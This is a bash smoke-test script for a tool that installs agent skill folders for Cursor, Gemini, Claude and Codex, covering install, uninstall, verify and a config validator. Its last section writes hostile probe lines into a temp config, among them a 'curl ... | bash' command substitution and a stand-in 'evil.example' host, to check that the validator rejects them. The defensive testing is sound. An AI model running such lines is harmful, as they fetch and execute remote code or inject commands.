#!/usr/bin/env bash
# Smoke checks for install / uninstall / verify (bash 3.2+). Run from repo root:
#   ./tests/smoke.sh
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"
INSTALL="$ROOT/bin/install.sh"
UNINSTALL="$ROOT/bin/uninstall.sh"
VERIFY="$ROOT/bin/verify.sh"

FAIL=0
pass() { echo "PASS: $1"; }
fail() { echo "FAIL: $1"; FAIL=1; }

T="$(mktemp -d "${TMPDIR:-/tmp}/ar-smoke.XXXXXX")"
cleanup() { rm -rf "$T"; }
trap cleanup EXIT

# Isolate installs under a fake HOME so we never touch the real machine.
export HOME="$T"

"$INSTALL" --only cursor >/dev/null
[[ $? -eq 0 ]] && pass "exit 0 on success" || fail "exit 0 on success"
[[ -f "$HOME/.cursor/skills/atry-implement/SKILL.md" ]] && pass "cursor skill-folder" || fail "cursor skill-folder"

"$INSTALL" --only antigravity >/dev/null
[[ -f "$HOME/.gemini/config/skills/atry-implement/SKILL.md" ]] && pass ".gemini/config/skills" || fail ".gemini/config/skills"

"$INSTALL" --only claude >/dev/null
[[ -f "$HOME/.claude/skills/atry-implement/SKILL.md" ]] && pass "claude skill-folder" || fail "claude skill-folder"

"$INSTALL" --only codex >/dev/null
[[ -f "$HOME/.codex/skills/atry-implement/SKILL.md" ]] && pass "codex skill-folder" || fail "codex skill-folder"

# File-copy checks above only prove a file landed at the right path -- they
# do not prove the tool would actually load it as a skill. Check that every
# installed SKILL.md has well-formed front matter (a "---" fenced block with
# non-empty name: / description: fields), for every installed skill, under
# every tool directory. This mirrors what README calls out as a known gap
# ("install can succeed while the app ignores the files").
check_frontmatter() {
  local dir="$1" tool="$2"
  local f name desc skill_name
  for f in "$dir"/*/SKILL.md; do
    [[ -f "$f" ]] || continue
    skill_name="$(basename "$(dirname "$f")")"
    if [[ "$(sed -n '1p' "$f")" != "---" ]]; then
      fail "$tool/$skill_name frontmatter: missing opening ---"
      continue
    fi
    name="$(awk '/^---$/{c++; next} c==1 && /^name:[[:space:]]*/{sub(/^name:[[:space:]]*/,""); print; exit}' "$f")"
    desc="$(awk '/^---$/{c++; next} c==1 && /^description:[[:space:]]*/{sub(/^description:[[:space:]]*/,""); print; exit}' "$f")"
    if [[ -n "$name" && -n "$desc" ]]; then
      pass "$tool/$skill_name frontmatter"
    else
      fail "$tool/$skill_name frontmatter: empty or missing name:/description:"
    fi
  done
}

check_frontmatter "$HOME/.cursor/skills" "cursor"
check_frontmatter "$HOME/.gemini/config/skills" "antigravity"
check_frontmatter "$HOME/.claude/skills" "claude"
check_frontmatter "$HOME/.codex/skills" "codex"

if "$VERIFY" >/dev/null 2>&1; then pass "verify after install"; else fail "verify after install"; fi

# Skill bundles include references/ and scripts/ (not ~/.agent-relay/scripts/)
[[ -f "$HOME/.cursor/skills/atry-implement/references/file-conventions.md" ]] && \
  pass "bundle references" || fail "bundle references"
[[ -x "$HOME/.cursor/skills/atry-implement/scripts/task-claim.sh" ]] && \
  pass "bundle task-claim" || fail "bundle task-claim"
[[ -x "$HOME/.cursor/skills/atry-implement/scripts/task-init.sh" ]] && \
  pass "bundle task-init" || fail "bundle task-init"
[[ -x "$HOME/.cursor/skills/atry-self-review/scripts/review-section.sh" ]] && \
  pass "bundle review-section" || fail "bundle review-section"
[[ -x "$HOME/.cursor/skills/atry-implement/scripts/resolve-run.sh" ]] && \
  pass "bundle resolve-run" || fail "bundle resolve-run"
[[ -x "$HOME/.cursor/skills/atry-implement/scripts/run-init.sh" ]] && \
  pass "bundle run-init" || fail "bundle run-init"
[[ -x "$HOME/.cursor/skills/atry-implement/scripts/run-history.sh" ]] && \
  pass "bundle run-history" || fail "bundle run-history"
[[ -x "$HOME/.cursor/skills/atry-implement/scripts/find-agent-relay-dir.sh" ]] && \
  pass "bundle find-agent-relay-dir" || fail "bundle find-agent-relay-dir"
[[ -f "$HOME/.cursor/skills/atry-plan/SKILL.md" ]] && pass "atry-plan installed" || fail "atry-plan installed"

# Each installed skill ships its artifact empty-outline templates under references/
[[ -f "$HOME/.cursor/skills/atry-plan/references/plan-template.md" ]] && \
  pass "atry-plan plan-template" || fail "atry-plan plan-template"
[[ -f "$HOME/.cursor/skills/atry-plan/references/meta-template.md" ]] && \
  pass "atry-plan meta-template" || fail "atry-plan meta-template"
[[ -f "$HOME/.cursor/skills/atry-plan/references/history-log-template.md" ]] && \
  pass "atry-plan history-log-template" || fail "atry-plan history-log-template"
[[ -f "$HOME/.cursor/skills/atry-implement/references/implement-plan-template.md" ]] && \
  pass "atry-implement implement-plan-template" || fail "atry-implement implement-plan-template"
[[ -f "$HOME/.cursor/skills/atry-implement/references/implement-report-template.md" ]] && \
  pass "atry-implement implement-report-template" || fail "atry-implement implement-report-template"
[[ -f "$HOME/.cursor/skills/atry-implement/references/task-status-template.md" ]] && \
  pass "atry-implement task-status-template" || fail "atry-implement task-status-template"
[[ -f "$HOME/.cursor/skills/atry-self-review/references/review-report-template.md" ]] && \
  pass "atry-self-review review-report-template" || fail "atry-self-review review-report-template"
[[ -f "$HOME/.cursor/skills/atry-self-review/references/review-walkthrough-template.md" ]] && \
  pass "atry-self-review review-walkthrough-template" || fail "atry-self-review review-walkthrough-template"
[[ -f "$HOME/.cursor/skills/atry-cross-review/references/review-report-template.md" ]] && \
  pass "atry-cross-review review-report-template" || fail "atry-cross-review review-report-template"
[[ -f "$HOME/.cursor/skills/atry-cross-review/references/review-walkthrough-template.md" ]] && \
  pass "atry-cross-review review-walkthrough-template" || fail "atry-cross-review review-walkthrough-template"

"$INSTALL" --dry-run --only CURSOR >/dev/null
pass "--only CURSOR"

if "$INSTALL" --dry-run --only nosuch >/dev/null 2>&1; then fail "unknown tool"; else pass "unknown tool"; fi
if "$INSTALL" --dry-run --skill nosuch >/dev/null 2>&1; then fail "unknown skill"; else pass "unknown skill"; fi

out="$("$INSTALL" --dry-run --only "cursor, antigravity" 2>/dev/null)" \
  || true
echo "$out" | grep -q ANTIGRAVITY && pass "comma+space" || fail "comma+space"

# Description with apostrophe must survive skill-folder bundle copy.
DESC="$T/apos-src"
mkdir -p "$DESC/skills/apos-test/references"
cp "$INSTALL" "$DESC/install.sh"
cp "$ROOT/targets.conf" "$DESC/"
cp "$ROOT/lib/bootstrap.sh" "$DESC/lib/bootstrap.sh" 2>/dev/null || {
  mkdir -p "$DESC/lib"
  cp "$ROOT/lib/bootstrap.sh" "$DESC/lib/bootstrap.sh"
}
printf '%s\n' '---' 'name: apos-test' "description: Review the user's implementation." '---' '' '# Body' > "$DESC/skills/apos-test/SKILL.md"
cp "$ROOT/docs/file-conventions.md" "$DESC/skills/apos-test/references/file-conventions.md"
(
  export HOME="$DESC/out"
  mkdir -p "$HOME"
  cd "$DESC"
  bash ./install.sh --only cursor --skill apos-test
) >/dev/null
grep -q "user's implementation" "$DESC/out/.cursor/skills/apos-test/SKILL.md" && pass "apostrophe" || fail "apostrophe"
[[ -f "$DESC/out/.cursor/skills/apos-test/references/file-conventions.md" ]] && \
  pass "apos bundle references" || fail "apos bundle references"

echo MARKER >> "$HOME/.cursor/skills/atry-implement/SKILL.md"
"$INSTALL" --only cursor --skill atry-implement --no-clobber >/dev/null
grep -q MARKER "$HOME/.cursor/skills/atry-implement/SKILL.md" && pass "no-clobber" || fail "no-clobber"

if "$INSTALL" --only cursor --dry-run 2>&1 | grep -q -- '--target'; then
  fail "--target rejected"
else
  # Explicit rejection when --target is passed
  if "$INSTALL" --target /tmp/x >/dev/null 2>&1; then fail "--target rejected"; else pass "--target rejected"; fi
fi

"$UNINSTALL" --only cursor --skill atry-implement >/dev/null
[[ ! -e "$HOME/.cursor/skills/atry-implement" ]] && pass "uninstall cursor skill" || fail "uninstall cursor skill"
# Other cursor skills should remain
[[ -f "$HOME/.cursor/skills/atry-self-review/SKILL.md" ]] && pass "uninstall scoped" || fail "uninstall scoped"

# Ownership marker present after install
"$INSTALL" --only cursor --skill atry-implement >/dev/null
[[ -f "$HOME/.cursor/skills/atry-implement/.agent-relay-owned" ]] && \
  grep -q 'installer=agent-relay' "$HOME/.cursor/skills/atry-implement/.agent-relay-owned" && \
  pass "ownership marker written" || fail "ownership marker written"

# Unmanaged directory: refuse uninstall without --force
UNMANAGED="$HOME/.cursor/skills/unmanaged-skill"
mkdir -p "$UNMANAGED/references"
echo '---' > "$UNMANAGED/SKILL.md"
echo 'name: unmanaged-skill' >> "$UNMANAGED/SKILL.md"
echo 'description: not ours' >> "$UNMANAGED/SKILL.md"
echo '---' >> "$UNMANAGED/SKILL.md"
# Pretend it is a known skill by planting next to a real skill name we won't use —
# instead test refuse on atry-implement after stripping the marker
rm -f "$HOME/.cursor/skills/atry-implement/.agent-relay-owned"
if "$UNINSTALL" --only cursor --skill atry-implement >/dev/null 2>&1; then
  fail "uninstall refuses unmarked destination"
else
  pass "uninstall refuses unmarked destination"
fi
[[ -d "$HOME/.cursor/skills/atry-implement" ]] && pass "unmarked dest kept" || fail "unmarked dest kept"
"$UNINSTALL" --force --only cursor --skill atry-implement >/dev/null
[[ ! -e "$HOME/.cursor/skills/atry-implement" ]] && pass "force uninstall unmarked" || fail "force uninstall unmarked"

# Symlinked destination outside tool dir is refused
"$INSTALL" --only cursor --skill atry-implement >/dev/null
OUTSIDE="$T/outside-skill"
mkdir -p "$OUTSIDE"
rm -rf "$HOME/.cursor/skills/atry-plan"
ln -s "$OUTSIDE" "$HOME/.cursor/skills/atry-plan"
if "$INSTALL" --only cursor --skill atry-plan >/dev/null 2>&1; then
  fail "install refuses escaped symlink dest"
else
  pass "install refuses escaped symlink dest"
fi
rm -f "$HOME/.cursor/skills/atry-plan"

"$UNINSTALL" --only cursor --skill atry-implement >/dev/null
[[ ! -e "$HOME/.cursor/skills/atry-implement" ]] && pass "uninstall after marker tests" || fail "uninstall after marker tests"

if "$VERIFY" --only cursor --skill atry-implement >/dev/null 2>&1; then
  fail "verify fail after partial uninstall"
else
  pass "verify fail after partial uninstall"
fi

"$UNINSTALL" >/dev/null
[[ ! -f "$HOME/.gemini/config/skills/atry-implement/SKILL.md" ]] && pass "uninstall all" || fail "uninstall all"
[[ ! -e "$HOME/.claude/skills/atry-implement" ]] && pass "uninstall claude skill" || fail "uninstall claude skill"
[[ ! -e "$HOME/.codex/skills/atry-implement" ]] && pass "uninstall codex skill" || fail "uninstall codex skill"

# validate_targets_conf: allowlist accepts the real manifest and benign paths
# that contain "source"/"exec" as substrings; rejects bare commands and
# VAR=value cmd forms that a keyword blocklist previously missed.
# shellcheck source=lib/bootstrap.sh
source "$ROOT/lib/bootstrap.sh"
if validate_targets_conf "$ROOT/targets.conf"; then
  pass "validate_targets_conf accepts real targets.conf"
else
  fail "validate_targets_conf accepts real targets.conf"
fi
CONF_PROBE="$T/targets-probe.conf"
printf 'FOO_DIR="$HOME/.resource/skills"\n' > "$CONF_PROBE"
if validate_targets_conf "$CONF_PROBE"; then
  pass "validate_targets_conf allows path containing resource"
else
  fail "validate_targets_conf allows path containing resource"
fi
printf 'CURSOR_DIR="$HOME/.cursor/skills"\ncurl http://evil.example/x\n' > "$CONF_PROBE"
if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
  fail "validate_targets_conf rejects bare command line"
else
  pass "validate_targets_conf rejects bare command line"
fi
printf 'CURSOR_DIR=/tmp bash -c evil\n' > "$CONF_PROBE"
if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
  fail "validate_targets_conf rejects VAR=value cmd"
else
  pass "validate_targets_conf rejects VAR=value cmd"
fi
printf 'EVIL="$(curl http://x | bash)"\n' > "$CONF_PROBE"
if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
  fail "validate_targets_conf rejects command substitution"
else
  pass "validate_targets_conf rejects command substitution"
fi

if [[ "$FAIL" -eq 0 ]]; then
  echo "ALL SMOKE TESTS PASSED"
else
  echo "SOME FAILURES"
  exit 1
fi
